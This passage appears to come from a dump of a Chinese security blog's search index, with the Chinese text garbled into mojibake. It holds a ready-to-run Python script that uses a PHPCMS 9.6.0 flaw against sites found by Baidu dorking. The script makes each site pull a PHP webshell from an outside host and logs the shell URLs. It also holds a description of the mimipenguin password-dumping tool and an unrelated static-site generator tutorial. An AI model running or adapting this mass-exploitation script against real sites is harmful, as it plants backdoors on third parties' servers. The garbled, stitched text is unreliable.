data[\u0026#34;email\u0026#34;] = \u0026#34;akkuman_%s@qq.com\u0026#34; % rand_name htmlContent = requests.post(url, data=data) successUrl = \u0026#34;\u0026#34; if \u0026#34;MySQL Error\u0026#34; in htmlContent.text and \u0026#34;http\u0026#34; in htmlContent.text: successUrl = htmlContent.text[htmlContent.text.index(\u0026#34;http\u0026#34;):htmlContent.text.index(\u0026#34;.php\u0026#34;)] + \u0026#34;.php\u0026#34; print(\u0026#34;[*]Shell : %s\u0026#34; % successUrl) if successUrl == \u0026#34;\u0026#34;: print(\u0026#34;[x]Failed : had crawled all possible url, but i can\u0026#39;t find out it. So it\u0026#39;s failed.\\n\u0026#34;) except: print(\u0026#34;Request Error\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: main() æ‰¹é‡ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 # -*- coding:utf-8 -*- \u0026#39;\u0026#39;\u0026#39; ---------------------- Author : Akkuman Blog : www.hacktech.cn ---------------------- \u0026#39;\u0026#39;\u0026#39; import requests from bs4 import BeautifulSoup # from urlparse import unquote //Python2 # from urlparse import urlparse //Python2 from urllib.parse import quote from urllib.parse import urlparse from random import Random chars = \u0026#39;qwertyuiopasdfghjklzxcvbnm0123456789\u0026#39; headers = { \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0\u0026#34; } def parseBaidu(keyword, pagenum): keywordsBaseURL = \u0026#39;https://www.baidu.com/s?wd=\u0026#39; + str(quote(keyword)) + \u0026#39;\u0026amp;oq=\u0026#39; + str(quote(keyword)) + \u0026#39;\u0026amp;ie=utf-8\u0026#39; + \u0026#39;\u0026amp;pn=\u0026#39; pnum = 0 while pnum \u0026lt;= int(pagenum): baseURL = keywordsBaseURL + str(pnum*10) try: request = requests.get(baseURL, headers=headers) soup = BeautifulSoup(request.text, \u0026#34;html.parser\u0026#34;) for a in soup.select(\u0026#39;div.c-container \u0026gt; h3 \u0026gt; a\u0026#39;): url = requests.get(a[\u0026#39;href\u0026#39;], headers=headers).url yield url except: yield None finally: pnum += 1 def saveShell(shellUrl): with open(\u0026#34;webShell.txt\u0026#34;,\u0026#34;a+\u0026#34;) as f: f.write(\u0026#34;[*]%s\\n\u0026#34; % shellUrl) def main(): data = { \u0026#34;siteid\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;modelid\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;akkumandsad\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;123456\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;akkakkumafa@qq.com\u0026#34;, # å¦‚æœæƒ³ä½¿ç”¨å›è°ƒçš„å¯ä»¥ä½¿ç”¨http://file.codecat.one/oneword.txtï¼Œä¸€å¥è¯åœ°å€ä¸º.phpåé¢åŠ ä¸Še=YXNzZXJ0,æ™®é€šä¸€å¥è¯http://file.codecat.one/normalOneWord.txt \u0026#34;info[content]\u0026#34;: \u0026#34;\u0026lt;img src=http://7xusrl.com1.z0.glb.clouddn.com/bypassdog.txt?.php#.jpg\u0026gt;\u0026#34;, \u0026#34;dosubmit\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;protocol\u0026#34;: \u0026#34;\u0026#34;, } for crawlUrl in parseBaidu(\u0026#34;inurl:index.php?m=member\u0026amp;c=index\u0026amp;a=register\u0026amp;siteid=1\u0026#34;, 10): try: if crawlUrl: rand_name = chars[Random().randint(0, len(chars) - 1)] data[\u0026#34;username\u0026#34;] = \u0026#34;akkuman_%s\u0026#34; % rand_name data[\u0026#34;email\u0026#34;] = \u0026#34;akkuman_%s@qq.com\u0026#34; % rand_name host = urlparse(crawlUrl).scheme + \u0026#34;://\u0026#34; + urlparse(crawlUrl).hostname url = host + \u0026#34;/index.php?m=member\u0026amp;c=index\u0026amp;a=register\u0026amp;siteid=1\u0026#34; htmlContent = requests.post(url, data=data, timeout=10) successUrl = \u0026#34;\u0026#34; if \u0026#34;MySQL Error\u0026#34; in htmlContent.text and \u0026#34;http\u0026#34; in htmlContent.text: successUrl = htmlContent.text[htmlContent.text.index(\u0026#34;http\u0026#34;):htmlContent.text.index(\u0026#34;.php\u0026#34;)] + \u0026#34;.php\u0026#34; print(\u0026#34;[*]Shell : %s\u0026#34; % successUrl) saveShell(successUrl) if successUrl == \u0026#34;\u0026#34;: print(\u0026#34;[x]Failed : Failed to getshell.\u0026#34;) else: continue except: print(\u0026#34;Request Error\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: main() æµ‹è¯•å›¾ å•ä¸ª æ‰¹é‡ ä¸‹è½½åœ°å€ ä»£ç ä¸‹è½½åœ°å€\n","permalink":"https://www.hacktech.cn/post/phpcms9-6-0-getshell-with-python.html","summary":"\u003ch2 id=\"ä»‹ç»\"\u003eä»‹ç»\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eä¸€é”®åŒ–\u003ccode\u003epython 1.py http://xxx.com\u003c/code\u003e,å¦‚æœæ˜¯æ‰¹é‡ç›´æ¥è¿è¡Œpyæ–‡ä»¶å³å¯\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"å¾…åŠ\"\u003eå¾…åŠ\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e[] åŠ å…¥å¯¹æœ‰éªŒè¯ç phpcmsç½‘ç«™çš„æ”¯æŒ\u003c/li\u003e\n\u003cli\u003e[] åŠ å…¥æ‰¹é‡(\u003cstrong\u003eå·²å®Œæˆ\u003c/strong\u003e)\u003c/li\u003e\n\u003c/ul\u003e","title":"phpcms9-6-0 ä¸€é”®getshellå·¥å…·"},{"content":"Githubé¡¹ç›®åœ°å€\nå‰æœ‰Mimikatzï¼Œä»Šæœ‰mimipenguinï¼Œè¿‘æ—¥å›½å¤–å®‰å…¨ç ”ç©¶å‘˜huntergregalå‘å¸ƒäº†å·¥å…·mimipenguinï¼Œä¸€æ¬¾Linuxä¸‹çš„å¯†ç æŠ“å–ç¥å™¨ï¼Œå¯ä»¥è¯´å¼¥è¡¥äº†Linuxä¸‹å¯†ç æŠ“å–çš„ç©ºç¼ºã€‚ ç¼–å†™æ€è·¯æ¥è‡ªæµè¡Œçš„windowså¯†ç æŠ“å–ç¥å™¨mimikatz\nè¯¦æƒ… é€šè¿‡è½¬å‚¨è¿‡ç¨‹å’Œæå–é‚£äº›åŒ…å«æ˜æ–‡å¯†ç å¯èƒ½æ€§å¾ˆé«˜çš„è¡Œï¼ˆhangï¼‰ï¼Œå……åˆ†åˆ©ç”¨å†…å­˜ä¸­çš„æ˜æ–‡å‡­è¯ã€‚é€šè¿‡æ£€æŸ¥/etc/shadowæ–‡ä»¶hash,å†…å­˜ä¸­çš„hashå’Œæ­£åˆ™åŒ¹é…å»å°è¯•è®¡ç®—å‡ºæ¯ä¸ªå•è¯çš„æ¦‚ç‡\nè¦æ±‚ rootæƒé™ å·²æ”¯æŒ(ä»¥ä¸‹ç¯å¢ƒå·²é€šè¿‡æµ‹è¯•) Kali 4.3.0 (rolling) x64 (gdm3) Ubuntu Desktop 12.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2) Ubuntu Desktop 16.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2) XUbuntu Desktop 16.04 x64 (Gnome Keyring 3.18.3-0ubuntu2) VSFTPd 3.0.3-8+b1 (Active FTP client connections) Apache2 2.4.25-3 (Active/Old HTTP BASIC AUTH Sessions) [Gcore dependency] openssh-server 1:7.3p1-1 (Active SSH connections - sudo usage) è®°å½• åœ¨å†…å­˜ä¸­çš„å¯†ç  - 100%æœ‰æ•ˆ è®¡åˆ’æ‰©å¤§æ”¯æŒå’Œå…¶ä»–å‡­è¯ä½ç½® åŠªåŠ›æ‰©å±•åˆ°éæ¡Œé¢ç¯å¢ƒ å·²çŸ¥bug - æœ‰æ—¶gcoreä¼šæŒ‚èµ·è„šæœ¬ï¼Œä¸è¿‡è¿™æ˜¯gcoreå¯¼è‡´çš„é—®é¢˜ å¼€æ”¾æå‡ºè¯·æ±‚å’Œç¤¾åŒºç ”ç©¶ è®¡åˆ’æœªæ¥çš„LDAPç ”ç©¶ï¼ˆnscld winbindç­‰ï¼‰ è”ç³»æ–¹å¼ Twitter: @huntergregal ä¸ªäººç«™ç‚¹: huntergregal.com Github: huntergregal ç‰¹åˆ«é¸£è°¢ the-useless-one for remove Gcore as a dependency, cleaning up tabs, and adding output option gentilkiki for Mimikatz, the inspiration and the twitter shoutout pugilist for cleaning up PID extraction and testing ianmiell for cleaning up some of my messy code w0rm for identifying printf error when special chars are involved benichmt1 for identifying multiple authenticate users issue ChaitanyaHaritash for identifying special char edge case issues è½¬è½½è‡ªmimipenguin\n","permalink":"https://www.hacktech.cn/post/mimipenguin.html","summary":"\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/huntergregal/mimipenguin\"\u003eGithubé¡¹ç›®åœ°å€\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eå‰æœ‰Mimikatzï¼Œä»Šæœ‰mimipenguinï¼Œè¿‘æ—¥å›½å¤–å®‰å…¨ç ”ç©¶å‘˜huntergregalå‘å¸ƒäº†å·¥å…·mimipenguinï¼Œä¸€æ¬¾Linuxä¸‹çš„å¯†ç æŠ“å–ç¥å™¨ï¼Œå¯ä»¥è¯´å¼¥è¡¥äº†Linuxä¸‹å¯†ç æŠ“å–çš„ç©ºç¼ºã€‚\nç¼–å†™æ€è·¯æ¥è‡ªæµè¡Œçš„\u003ca href=\"https://github.com/gentilkiwi/mimikatz\"\u003ewindowså¯†ç æŠ“å–ç¥å™¨mimikatz\u003c/a\u003e\u003c/p\u003e","title":"æŠ“å–å½“å‰ç™»å½•ç”¨æˆ·ç™»å½•å¯†ç çš„å·¥å…·ï¼šmimipenguin"},{"content":"ç®€ä»‹ WDTPï¼ˆå±±æ¹–å½•ï¼‰ä¸æ­¢æ˜¯ä¸€æ¬¾å¼€æºå…è´¹çš„GUIæ¡Œé¢å•æœºç‰ˆé™æ€ç½‘ç«™ç”Ÿæˆå™¨å’Œç®€å•æ–¹ä¾¿çš„å‰ç«¯å¼€å‘å·¥å…·ï¼Œæ›´æ˜¯ä¸€æ¬¾è·¨å¹³å°çš„é›†ç¬”è®°ã€å½•éŸ³ã€ä¸ªäººçŸ¥è¯†ç®¡ç†ã€å†™ä½œ/åˆ›ä½œã€åšå®¢/ç½‘ç«™å†…å®¹ä¸æ ·å¼ç®¡ç†ç­‰åŠŸèƒ½äºä¸€ä½“çš„å¤šåˆä¸€å†…å®¹å¤„ç†/ç®¡ç†å™¨ï¼ŒåŒæ—¶è¿˜æ˜¯ä¸€æ¬¾é«˜åº¦è¿½æ±‚ç”¨æˆ·ä½“éªŒçš„Markdownæ–‡æœ¬ç¼–è¾‘å™¨å’Œä¸€æ¬¾æ–¹ä¾¿å¼ºå¤§çš„å½•éŸ³æœºã€‚æœ¬è½¯ä»¶ç ”å‘çš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šç®€æ´é«˜æ•ˆã€è½»çµä¼˜é›…ã€å…ˆè¿›å¼ºæ‚ã€æ“ä½œç®€å•ã€‚\nWDTPï¼ˆå±±æ¹–å½•ï¼‰å¯è¿è¡ŒäºmacOSå’ŒWindowsç³»ç»Ÿä¸‹ï¼Œæ—¨åœ¨æé«˜è¿™ä¸¤å¤§å¹³å°ä¸‹æ‰€æœ‰å†™ä½œ/åˆ†äº«è€…çš„ç”Ÿäº§åŠ›åŠç”Ÿäº§æ•ˆç‡ï¼ŒèŠ‚çº¦è€—æ—¶ï¼Œå‡å°‘æ— è°“çš„æ™ºèƒ½ã€ä½“åŠ›ä¸èµ„æºæ¶ˆè€—ã€‚å®ƒé€‚åˆäºä»¥ä¸‹ç¾¤ä½“ï¼š\nä»¥æ–‡å­—ã€å£°éŸ³ã€å›¾ç‰‡ã€è§†é¢‘ä¸ºä¸»è¦å†…å®¹çš„å†™ä½œ/è®°å½•/åˆ›ä½œ/åˆ†äº«è€… èŒä¸šæˆ–ä¸šä½™ä½œå®¶ã€å°è¯´å®¶ã€ç¼–å‰§ã€æŠ€æœ¯ç±»å›¾ä¹¦çš„ä½œè€…åŠç¼–æ’°è€… ç»å¸¸è®°ç¬”è®°æˆ–å†™ç‚¹ä¸œè¥¿çš„äºº å†™ä½œæå®¢ æ‰“ç®—é‡‡ç”¨é™æ€é¡µé¢çš„ä¸ªäººåšå®¢ æ‰“ç®—é‡‡ç”¨é™æ€é¡µé¢çš„ä¸­å°ä¼ä¸š WDTPçš„å…¨åæ˜¯ï¼šWalden Tipsï¼Œä¸­æ–‡åç§°ï¼šå±±æ¹–å½•ï¼ŒUnderwaySoftå¼€å‘å‡ºå“ã€‚è®¾è®¡ã€ç¼–ç¨‹åŠç»´æŠ¤ï¼šSwingCoderã€‚ç«‹é¡¹æ—¥æœŸï¼š2016å¹´8æœˆ2æ—¥ï¼Œç¬¬ä¸€ä¸ªå†…æµ‹ç‰ˆå‘å¸ƒæ—¥æœŸï¼š2017å¹´2æœˆ3æ—¥ã€‚ æ ¸å¿ƒåŠŸèƒ½ åˆ›ä½œã€‚å¯¹èŒä¸šä½œå®¶ï¼ˆç‰¹åˆ«æ˜¯æŠ€æœ¯ä½œå®¶ä»¥åŠéœ€è¦å¤§é‡æ„æ€ä¸æƒ…èŠ‚ç¼–æ’çš„æ–‡è‰ºä½œå®¶ï¼‰æ¥è¯´æ¯”Pagesã€Wordç­‰WYSWYGç±»å‹çš„æ¡Œé¢æ–‡å­—è½¯ä»¶æ›´åŠ é«˜æ•ˆã€ç®€æ´å’Œçµæ´»çš„å†…å®¹åˆ›ä½œã€ç« èŠ‚ç®¡ç†ä¸æ ¼å¼åŒ–æ’ç‰ˆå·¥å…·ã€‚å¯æ–¹ä¾¿åœ°å®ç°å¤šç« èŠ‚ï¼ˆæƒ…èŠ‚ã€åœºæ™¯ã€æ¦‚å¿µã€æ•…äº‹ä¸»çº¿ç­‰ï¼‰å¹¶å‘åˆ›ä½œ/ç¼–è¾‘ã€ä»»æ„è°ƒåºã€éšæ„å½’ç±»ç­‰å¼ºå¤§åŠŸèƒ½ï¼Œå®Œç¨¿åä¸€é”®å³å¯æˆä¹¦ã€‚ ç¬”è®°ã€‚å¯éšæ—¶è®°å½•å¹¶ç®¡ç†å­¦ä¹ ç¬”è®°ã€è¯»ä¹¦ç¬”è®°ä»¥åŠæœ‰ä¸€å®šç¯‡å¹…å¹¶æ‰“ç®—ç»“æ„åŒ–ä¿å­˜ã€ç®¡ç†ã€æ£€è§†å’Œå°è£…çš„é›¶æ˜Ÿéšè®°ã€æ‚æ„Ÿç­‰ç­‰ã€‚å¯å®šæœŸå°†æ‰€æœ‰æˆ–ä»»æ„åˆ†ç±»ï¼ˆç›®å½•ï¼‰ä¸‹çš„ç¬”è®°â€œè£…è®¢æˆå†Œâ€ã€é›†ä¸­è¾“å‡ºï¼Œä¸€é”®å³å¯å®Œæˆã€‚ å»ºç«™ã€‚å¼ºå¤§è€Œæ–°é¢–çš„é™æ€ç½‘ç«™ç»´æŠ¤ã€ç¼–è¾‘ã€ç”Ÿæˆã€ä»£ç è°ƒè¯•ä¸å†…å®¹ã€ç»“æ„ç®¡ç†ç³»ç»Ÿã€‚ç‰¹åˆ«é€‚åˆè¿½æ±‚å…¨ç«™çœŸæ­£é™æ€åŒ–ã€å†…å®¹è‡³ä¸Šçš„ä¸ªäººåšå®¢ä¸ä¸­å°ä¼ä¸šå®˜ç½‘ã€‚ Markdownç¼–è¾‘å™¨ã€‚åœ¨ä¿ç•™å¹¶è§„èŒƒäº†å¤§éƒ¨åˆ†â€œæ­£ç»Ÿâ€Markdownè¯­æ³•çš„åŸºç¡€ä¸Šï¼ŒWDTPæ ¹æ®å¤§å¤šæ•°ä½œè€…/ä½œå®¶çš„å®é™…éœ€æ±‚ï¼Œå¢åŠ äº†ä¸€æ‰¹éå¸¸å®ç”¨çš„æ–°æ–‡æœ¬æ ‡è®°è¯­æ³•ã€‚æ¯”å¦‚ï¼šæ’å…¥å›¾æ³¨å’Œè¡¨æ³¨ã€å±…ä¸­ã€é å³ã€å¤šç§ç±»å‹çš„è¡¨æ ¼ã€å›¾æ–‡æ··æ’ã€æ’å…¥éŸ³è§†é¢‘åª’ä½“æ–‡ä»¶ã€å†…å®¹æ³¨é‡Šã€è·¨æ–‡æ¡£æ‰©å±•æ ‡è®°ç­‰ç­‰ã€‚è¯¥ç¼–è¾‘å™¨é’ˆå¯¹Windowsç³»ç»Ÿå’ŒmacOSç³»ç»Ÿï¼ˆéRetinaæ˜¾ç¤ºå±ï¼‰å¯¹ä¸­æ–‡å­—ä½“çš„æ¸²æŸ“ç»“æœä¸å°½äººæ„ç­‰æƒ…å†µä¸“é—¨åšäº†ç‰¹æ®Šä¼˜åŒ–ä¸è°ƒæ•´ï¼Œä½¿ç”¨æˆ·åœ¨è¾“å…¥ã€ç¼–è¾‘æ—¶å¯è·å¾—æ›´è‰¯å¥½çš„ä½“éªŒã€‚ ä»¥ä¸Šå‡ é¡¹ï¼Œä¸ä»…å¯ä»¥æ–‡å­—è¾“å…¥ï¼Œæ›´å¯ä»¥è¯­éŸ³è¾“å…¥ï¼Œç›´æ¥è®°å½•å£°éŸ³ã€‚è¿™ä¸€ç‚¹å¯¹ä¸æ“…é•¿æ–‡å­—è¡¨è¾¾çš„æœ‹å‹æˆ–è€…è®°è€…ã€æ¼”å‘˜ã€å„ç±»ä¸»æŒäººã€éŸ³ä¹å®¶ã€æ¼”å¥å®¶ç­‰ç¾¤ä½“æ¥è¯´éå¸¸æ–¹ä¾¿ã€‚ WDTPè¿˜æœ‰æå…·å®ç”¨ä»·å€¼çš„â€œå¤ä¹ /æé†’â€åŠŸèƒ½ï¼Œæ–‡æ¡£éšèº«åŠŸèƒ½ï¼Œæ–‡æ¡£ç¼©ç•¥è¯­åŠŸèƒ½å’Œæå…¶å¼ºæ‚çš„â€œæ™ºåº“â€æ¶æ„ã€‚ å…¶ä»–æ›´å¤šâ€¦â€¦ åœ¨â€œç¬”è®°ã€å†™ä¹¦ã€å»ºç«™/åšå®¢ã€å‰ç«¯å¼€å‘â€è¿™å‡ ä¸ªæ–¹é¢ï¼ŒWDTPï¼ˆå±±æ¹–å½•ï¼‰æ— ç¼é›†æˆï¼Œä¸€é”®åˆ‡æ¢ã€‚å³ï¼šåŒä¸€å¥—å†…å®¹ï¼Œéšæ—¶å¯ç”Ÿæˆä¸Šè¿°ä»»ä½•ä¸€ç§ç±»å‹ï¼Œè¿˜å¯å¤šç§ç±»å‹æ··åˆä½¿ç”¨ã€‚\nç¨‹åºé‡‡ç”¨c++è¯­è¨€ç¼–å†™ï¼Œä½œè€…åŒæ—¶ä¹Ÿæ˜¯æˆ‘ååˆ†æ•¬é‡çš„ä¸€ä½ç¨‹åºå‘˜ï¼Œå¦‚æœæƒ³æŸ¥çœ‹æ›´å¤šä¿¡æ¯è¯·è®¿é—®ä»–çš„é¡¹ç›®ä¸»é¡µç¨‹åºå¼€æºgithubåœ°å€\nä¸Šæ‰‹ä½¿ç”¨ æœ¬æ¥æƒ³è¯´æ›´å¤šçš„ï¼Œä½†æ˜¯ç¡®å®è¿™æ¬¾è½¯ä»¶å’Œå…¶ä»–çš„é™æ€åšå®¢ç”Ÿæˆå™¨ä¸ä¸€æ ·ï¼Œæ‹¥æœ‰ç€æ–¹ä¾¿çš„ç•Œé¢ï¼Œæ”¯æŒenglishå’Œä¸­æ–‡ï¼Œè®¾ç½®é‡Œé¢å³å¯åˆ‡æ¢ï¼Œç›¸ä¿¡åªè¦ä½ ä½¿ç”¨è¿‡ï¼Œä½ å°±ä¼šä½¿ç”¨å®ƒï¼Œèƒ½æ„Ÿå—åˆ°ä»–çš„æ–¹ä¾¿å¿«æ·ï¼Œå¦‚æœæƒ³çœ‹æ›´å¤šç©æ³•å’Œè¯´æ˜è¯·æŸ¥çœ‹é¡¹ç›®ä¸»é¡µï¼Œç°åœ¨åªæ”¯æŒä¸¤ç§æ¨¡æ¿book(ç”¨æ¥ä½œä¸ºç¬”è®°)å’Œblog(ç”¨æ¥ç”Ÿæˆé™æ€åšå®¢)ï¼Œä¸è¿‡ä½œè€…è¯´ä¼šé€æ¸å¢åŠ ä¸»é¢˜ï¼ŒçœŸçš„é™¤äº†æš‚æ—¶ä¸»é¢˜åŒ®ä¹ä¹‹å¤–(ä¼šå‰ç«¯çš„å¯ä»¥è‡ªå·±æ”¹æ”¹ä¸»é¢˜)ï¼Œå…¶ä»–çš„åŠŸèƒ½ç›¸æ¯”äºå…¶ä»–çš„é™æ€åšå®¢ç”Ÿæˆå™¨æ–¹ä¾¿å¾—ä¸æ˜¯ä¸€ä¸åŠç‚¹\né‚£ä¹ˆç”Ÿæˆé™æ€æ–‡ä»¶ä¹‹åå¦‚ä½•ä¸Šä¼ åˆ°è‡ªå·±çš„vpsæˆ–è€…github pagesæˆ–è€…coding pageså‘¢ï¼Ÿ\nä¸Šä¼ åˆ°vps è¿™ä¸ªä½ å¯ä»¥ä½¿ç”¨å¸¸è§„çš„FTPæˆ–è€…Rsyncæˆ–è€…å…¶ä»–æ–¹æ³•ä¸Šä¼ ï¼Œä¸è¿‡æˆ‘æ¨èè‡ªå·±çš„åšæ³•(ä½¿ç”¨Resilio Sync) å¦‚æœä½ çš„æœåŠ¡å™¨æ˜¯windowsé‚£ä¹ˆä½ åªéœ€è¦å»Resilio Syncå®˜ç½‘ä¸‹è½½ï¼Œå»ºè®®å®‰è£…ä¸ºæœåŠ¡ï¼Œç„¶åè®¿é—®æœ¬æœºsyncæœåŠ¡çš„ç½‘å€ï¼Œç‚¹å‡»å³ä¸Šè§’æ·»åŠ æ–‡ä»¶å¤¹æ·»åŠ ä½ çš„ç½‘ç«™æ ¹ç›®å½•ï¼Œç„¶åå¤åˆ¶è¯»å†™keyï¼Œæœ¬æœºå®‰è£…Resilio syncå®¢æˆ·ç«¯ç„¶åæ‰‹åŠ¨è¿æ¥è¿™ä¸ªkeyåˆ°ä½ çš„é™æ€æ–‡ä»¶ç›®å½•ï¼Œå…·ä½“å¯ä»¥æŸ¥èµ„æ–™ï¼Œè¿™ä¸ªä¸éš¾ å¦‚æœä½ çš„æœåŠ¡å™¨æ˜¯Linuxï¼Œå¯ä»¥æŸ¥çœ‹Resilio Syncç½‘ç«™ä¸Šé¢çš„How to install Sync Package on Linuxï¼Œè¯´æ˜æ¯”è¾ƒè¯¦ç»†ï¼Œå®‰è£…å¥½ä¹‹åå’Œä¸Šé¢çš„æ­¥éª¤ä¸€æ ·ï¼Œç„¶ååªè¦ä½ æœ¬æœºæŒ‚ç€resilio syncè½¯ä»¶ï¼Œç”Ÿæˆå°±å¯ä»¥å³æ—¶åŒæ­¥ã€‚ trust meï¼Œ ä½ å°†æ‰¾åˆ°è¿™ä¸ªè½¯ä»¶(Resilio Sync)æ›´å¤šçš„ç©æ³•ï¼Œè¿™è½¯ä»¶ä¹‹å‰çš„åå­—æ˜¯btsync å½“ç„¶ï¼Œè¿™åªæ˜¯æˆ‘è‡ªå·±ä½¿ç”¨çš„æ–¹æ³•ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ–¹æ³• è‡³äºä¸Šä¼ åˆ°github pagesæˆ–è€…coding pagesï¼Œè¿™ä¸ªä½ éœ€è¦ä¼šç”¨gitï¼Œè¿›å…¥é™æ€æ–‡ä»¶ç›®å½•ï¼Œç„¶åbashä¸‹æ‰§è¡Œ\n1 2 3 4 git init git add . git commit //å‘½ä»¤ç»™æ–‡ä»¶ä¸€ä¸ªä»“åº“æ ‡è®°ï¼Œåšä¸ºä»“åº“å†å²ï¼Œä¾¿äºä»¥ååœ¨è¿œç¨‹ç«¯æŸ¥æ‰¾ git remote add origin git@github.com:username/username.github.io.git git@github.com:username/username.github.io.gitçš„æ˜¯ä½ çš„gitè¿œç«¯åœ°å€ï¼Œè‡³äºä¸ºä»€ä¹ˆç”¨è¿™ä¸ªæ˜¯å› ä¸ºsshåˆ›å»ºå…¬é’¥ä¹‹åä¸ç”¨é‡å¤è¾“å…¥å¯†ç  **æ³¨: **å¦‚ä½•ç”Ÿæˆsshå…¬é’¥è¿™ç¯‡æ–‡ç« æ˜¯ä»¥coding.netä¸ºä¾‹ï¼Œä¸è¿‡ä½ ç”Ÿæˆçš„id_rsa.pubå†…å®¹åŒæ—¶ä¹Ÿå¯ä»¥æ·»åŠ åˆ°githubï¼ŒåŸºæœ¬ç›¸åŒçš„æ­¥éª¤ï¼Œå¦‚æœæœ‰ä»€ä¹ˆç–‘é—®å¯ä»¥ç™¾åº¦ä¸€ä¸‹å…³é”®è¯ä¸ºgithub sshå…¬é’¥ é…ç½®\næ·»åŠ è¯„è®ºåŠŸèƒ½ å¦‚æœä½ ä¸æ„¿æ„éº»çƒ¦å¯ä»¥ä½¿ç”¨é‚®ç®±æ¥æ”¶é›†è¯„è®º æ‰“å¼€qqé‚®ç®±ç‚¹å‡»ä¸Šæ–¹è®¾ç½®-\u0026gt;è´¦æˆ·-\u0026gt;é‚®æˆ‘-\u0026gt;ä½¿ç”¨é‚®æˆ‘ ç„¶åè·å–ä»£ç  å¤åˆ¶\u0026lt;a target=\u0026quot;_blank\u0026quot; href=\u0026quot;http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme\u0026amp;email=64qAgJ6GioWYq5qaxYiEhg\u0026quot; style=\u0026quot;text-decoration:none;\u0026quot;\u0026gt; ç„¶åæ‰“å¼€ä½ çš„é¡¹ç›®æ–‡ä»¶å¤¹/themes/blog/article.htmlï¼ŒæŠŠç›¸åº”çš„åœ°æ–¹æ”¹ä¸ºä¸‹é¢ä¾‹å­è¿™æ · 1 2 3 \u0026lt;div class=page_navi align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;b\u0026gt;\u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme\u0026amp;email=64qAgJ6GioWYq5qaxYiEhg\u0026#34; style=\u0026#34;text-decoration:none;\u0026#34;\u0026gt;è¯„è®º/å’¨è¯¢/è®¨è®º/ç•™è¨€\u0026lt;/a\u0026gt;\u0026lt;/b\u0026gt; \u0026lt;/div\u0026gt; ç„¶ååˆ«äººç‚¹å‡»è¯„è®ºå°±å¯ä»¥æ‰“å¼€ç»™ä½ å‘é‚®ä»¶çš„å…¥å£\nå¦‚æœä½ æƒ³æ·»åŠ ç¤¾ä¼šåŒ–è¯„è®ºç³»ç»Ÿ é‰´äºå¤šè¯´å³å°†å…³é—­ï¼Œå›½å†…æ²¡è¢«å¢™çš„æ— éœ€åŒ—å²¸çš„ç¬¬ä¸‰æ–¹è¯„è®ºå·²ç»å¾ˆå°‘äº†ï¼Œè¿™é‡Œæˆ‘ç”¨æ¥å¿…åŠ›åšä¾‹å­ æ³¨å†Œç™»å½•(å¦‚æœchromeæµè§ˆå™¨æ³¨å†Œä¹‹åä¸€ç›´ç™»å½•ä¸äº†è¯·ä½¿ç”¨ç«ç‹) ç‚¹å‡»é¡¶æ å®‰è£…ï¼Œç„¶åå¡«å¥½ç›¸å…³ä¿¡æ¯è·å–ä»£ç  ç„¶åæ‰“å¼€ä½ çš„é¡¹ç›®æ–‡ä»¶å¤¹/themes/blog/article.htmlï¼ŒæŠŠåŸå…ˆçš„è¯„è®ºä»£ç åˆ é™¤æ‰ï¼Œåœ¨åˆé€‚çš„åœ°æ–¹æ’å…¥ä¸Šæ–¹ä»£ç ï¼Œæˆ‘æ’å…¥å®Œä¹‹åçš„article.htmlä¾‹å­å¦‚ä¸‹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;Generator\u0026#34; content=\u0026#34;WDTP by UnderwaySoft\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;Author\u0026#34; content=\u0026#34;{{author}}\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;Keywords\u0026#34; content=\u0026#34;{{keywords}}\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;Description\u0026#34; content=\u0026#34;{{description}}\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;{{siteRelativeRootPath}}add-in/style.css\u0026#34;/\u0026gt; \u0026lt;title\u0026gt;{{title}}\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt; {{siteLogo}} {{siteMenu}} \u0026lt;hr\u0026gt; {{siteNavi}} {{content}} \u0026lt;hr\u0026gt; {{createAndModifyTime}} \u0026lt;div align=center\u0026gt;\u0026lt;h5\u0026gt;\u0026lt;p style=\u0026#34;background:PowderBlue\u0026#34;\u0026gt; æœ¬æ–‡ç‰ˆæƒï¼š{{siteLink}} \u0026amp;emsp; å…±äº«åè®®ï¼š\u0026lt;a href=\u0026#39;http://creativecommons.org/licenses/by-nc-nd/2.5/deed.zh\u0026#39; 